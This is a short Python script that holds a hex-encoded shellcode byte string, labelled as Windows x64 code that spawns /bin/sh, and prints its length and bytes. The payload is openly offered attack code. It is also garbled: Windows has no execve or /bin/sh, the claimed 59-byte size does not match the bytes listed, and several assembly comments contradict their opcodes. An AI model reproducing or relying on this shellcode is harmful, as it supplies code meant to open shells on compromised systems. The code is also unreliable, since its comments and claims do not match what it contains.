# shellcode.py
import struct

# Windows x64 execve("/bin/sh") shellcode (59 bytes)
shellcode = (
    b"\x48\x31\xc0"          # xor rax,rax
    b"\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff"  # mov rbx,0xffffffffffff8cc0
    b"\x48\x31\x58\x28"      # xor [rax+40],rbx
    b"\x48\x31\x40\x20"      # xor [rax+32],rax
    b"\x50"                  # push rax
    b"\x53"                  # push rbx
    b"\x48\x89\xe1"          # mov rcx,rsp
    b"\x65\x48\x8b\x04\x25"  # mov rax,[gs:fs:0x60]
    b"\x48\x31\x58\x30"      # xor [rax+48],rbx
    b"\x48\x89\xe1"          # mov rcx,rsp
    b"\x50"                  # push rax
    b"\x54"                  # push rsp
    b"\x49\xc7\xc0"          # mov rax,39
    b"\x2f\x62\x69\x6e"      # "/bin"
    b"\x48\xc7\xc7\x2f\x73\x68\x00"  # mov rdi,"/sh\0"
    b"\x48\xc7\xc6\x01\x00\x00\x00"  # mov rsi,1
    b"\x48\xc7\xc2\x01\x00\x00\x00"  # mov rdx,1
    b"\x0f\x05"              # syscall
)

print("[+] Shellcode size:", len(shellcode))
print("[+] Shellcode bytes:")
for i in range(0, len(shellcode), 16):
    line = shellcode[i:i+16]
    print(" ".join(f"{b:02x}" for b in line))
